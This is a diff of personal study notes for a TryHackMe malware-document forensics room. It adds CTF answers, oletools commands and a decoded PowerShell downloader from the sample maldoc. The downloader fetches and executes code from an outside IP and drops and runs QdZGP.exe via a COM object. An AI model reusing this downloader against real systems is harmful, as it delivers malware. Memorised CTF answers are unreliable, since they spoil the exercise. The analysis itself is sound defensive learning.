@@ -17,6 +17,11 @@ Goals:
 - Read Malware Analyst's Cookbook 
 - Other Objectives
 Learnt:
+- https://github.com/PaperMtn
+- Lena Rain is an awesome Composer - hackmud soundtrack hit very nicely at points
+- oletoolage
+- some vba
+- Forensics and a reminder of why Columbo is the best
 Beyond Root:
 - FEATURE CREEP MALWARE AND DETECTION
 - BiS Cyberchef
@@ -46,17 +51,16 @@ Also do you eyes a favour:
 
 ## My Scenario
 
+Fixed this to reflect actually finding from QB methods
 
 0. 50 Tyson Pushups because I want 300 a day by the end of next month so I look like [Witcher 2 Trailer levels of awesome](https://www.youtube.com/watch?v=tEA_wUk5pUs) , [L squat for 1 minute to trouble all the weebs with deductive reasoning](https://www.youtube.com/watch?v=CmVV4q_fSCk) and [1 minute plank to remind the furries that the trees have ears (Best have done is 4:22 minute plank](https://www.youtube.com/watch?v=Iw0jwrWqOKI))
 1. 1 Hour per Attacker Document, record what I did in [[Squid-Game-Notes-Attacker]]
 2. 50 Tyson Pushups because I want 300 a day by the end of next month so I look like [Witcher 2 Trailer levels of awesome](https://www.youtube.com/watch?v=tEA_wUk5pUs) , [L squat for 1 minute to trouble all the weebs with deductive reasoning](https://www.youtube.com/watch?v=CmVV4q_fSCk) and [1 minute plank to remind the furries that the trees have ears (Best have done is 4:22 minute plank](https://www.youtube.com/watch?v=Iw0jwrWqOKI))
 3. 30 minutes following multiple Writeups -> Collect Forensics and Malware Dev Problem solving Patterns
-4. 30 minutes ideas, rest, code scaffolding and copying (no Chatgpt); MUST have detection for each - so this should be a very fast and loose - focus on stupid questions not answers
-5. 30 minutes QB Method, Archive additions
-6. 50 Tyson Pushups because I want 300 a day by the end of next month so I look like [Witcher 2 Trailer levels of awesome](https://www.youtube.com/watch?v=tEA_wUk5pUs) , [L squat for 1 minute to trouble all the weebs with deductive reasoning](https://www.youtube.com/watch?v=CmVV4q_fSCk) and [1 minute plank to remind the furries that the trees have ears (Best have done is 4:22 minute plank](https://www.youtube.com/watch?v=Iw0jwrWqOKI))
-7. Repeat if there is time - replace Room for Attacker-X or code X and hopeful [Ionian nerve grip my problems](https://www.youtube.com/watch?v=xOFrFt5gKFw) and [For the emperor!](https://www.youtube.com/watch?v=7IMuLiNWyHg)
+4. 30 minutes ideas, rest, code scaffolding and copying (no Chatgpt); MUST have detection for each - so this should be a very fast and loose - focus on stupid questions not answers; minutes QB Method, Archive additions
+5. Repeat if there is time - replace Room for Attacker-X or code X and hopeful [Ionian nerve grip my problems](https://www.youtube.com/watch?v=xOFrFt5gKFw) and [For the emperor!](https://www.youtube.com/watch?v=7IMuLiNWyHg)
 
-3.5 hours
+2 hours
 
 5 Days of Squid-Gaming
 5 Days of tangent unfinished rooms that are CTFs 
@@ -94,56 +98,77 @@ Tools on the box of note:
 
 ## Attacker 1
 
+[Medium @kumarishefu.4507 Attacker 1](https://medium.com/@kumarishefu.4507/try-hack-me-write-up-squid-game-attacker1-9b4509882524); I got questions 6 - 9; checked [papermtn's blog](https://papermtn.co.uk/tryhackme-squid-game-attacker-1/), but it does not use different tools
+
 What is the malicious C2 domain you found in the maldoc where an executable download was attempted?; Answer:
 ```
+fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas
 ```
 QB-Forensics-Notes:
 ```
 ```
 What executable file is the maldoc trying to drop?; Answer:
 ```
+QdZGP.exe
 ```
 QB-Forensics-Notes:
 ```
 ```
 In what folder is it dropping the malicious executable? (hint: %Folder%); Answer:
 ```
+%ProgramData%
 ```
 QB-Forensics-Notes:
 ```
+Knowing Windows Knowing your favourite folders! AHAAAA  
+USED THE POWER OF MY BRAIN!
 ```
 Provide the name of the COM object the maldoc is trying to access.; Answer:
-```
+```bash
+# dork com object -thm C08AFD90-F2A1-11D1-8455-00A0C91F3880
+ShellBrowserWindow
 ```
 QB-Forensics-Notes:
 ```
 ```
 Include the malicious IP and the php extension found in the maldoc. (Format: IP/name.php); Answer:
 ```
+176.32.35.16/704e.php
 ```
 QB-Forensics-Notes:
 ```
 ```
 Find the phone number in the maldoc. (Answer format: xxx-xxx-xxxx); Answer:
-```
+```bash
+olemeta attacker1.doc
+# 213-446-1757
 ```
 QB-Forensics-Notes:
 ```
+Metadata 
 ```
 Doing some static analysis, provide the type of maldoc this is under the keyword “AutoOpen”.; Answer:
-```
+```bash
+olevba
+# AutoExec
 ```
 QB-Forensics-Notes:
 ```
 ```
 Provide the subject for this maldoc. (make sure to remove the extra whitespace); Answer:
-```
+```bash
+olemeta attacker1.doc
+# 213-446-1757
+# West Virginia  Samanta
 ```
 Provide the time when this document was last saved. (Format: YEAR-MONTH-DAY XX:XX:XX); Answer:
-```
+```bash
+oletimes
+# 2019-02-07 23:45:30
 ```
 QB-Forensics-Notes:
 ```
+Timestamp modification affect Forensic time lining
 ```
 Provide the stream number that contains a macro.; Answer:
 ```
@@ -156,6 +181,62 @@ Provide the name of the stream that contains a macro.; Answer:
 ```
 QB-Forensics-Notes:
 ```
+```
+
+Important Takeways
+```bash
+# Noting went well I found and noted Replace() function that helps in decoding the powershell script
+
+# Best practice seems to be go string by string till you hit a good line
+oledump.py -s $int $maldoc
+oledump.py -s $specialLineNum -S $maldoc
+```
+
+![](followingonday1.png)
+
+Nice bit of bad php that contains answers 1-5
+```php
+$instance = [System.Activator]::CreateInstance("System.Net.WebClient");
+$method = [System.Net.WebClient].GetMethods();
+foreach($m in $method){
+
+  if($m.Name -eq "DownloadString"){
+    try{
+     $uri = New-Object System.Uri("http://176.32.35.16/704e.php")
+     IEX($m.Invoke($instance, ($uri)));
+    }catch{}
+
+  }
+
+  if($m.Name -eq "DownloadData"){
+     try{
+     $uri = New-Object System.Uri("http://fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas")
+     $response = $m.Invoke($instance, ($uri));
+
+     $path = [System.Environment]::GetFolderPath("CommonApplicationData") + "\\QdZGP.exe";
+     [System.IO.File]::WriteAllBytes($path, $response);
+
+     $clsid = New-Object Guid 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
+     $type = [Type]::GetTypeFromCLSID($clsid)
+     $object = [Activator]::CreateInstance($type)
+     $object.Document.Application.ShellExecute($path,$nul, $nul, $nul,0)
+
+     }catch{}
+     
+  }
+}
+
+Exit;
+```
+
+
+GB-X Notes
+```
+Columbo deals in components and I just looked at the VBA like the attacker would have wanted and fell down a particial rabbithole of fear!
+
+Solution:
+- Have a fast eye for what you want to look for first
+- Input: toLookFor -> FastEyes(X amount of time) -> Output
 ```
 ## Attacker 2 
 
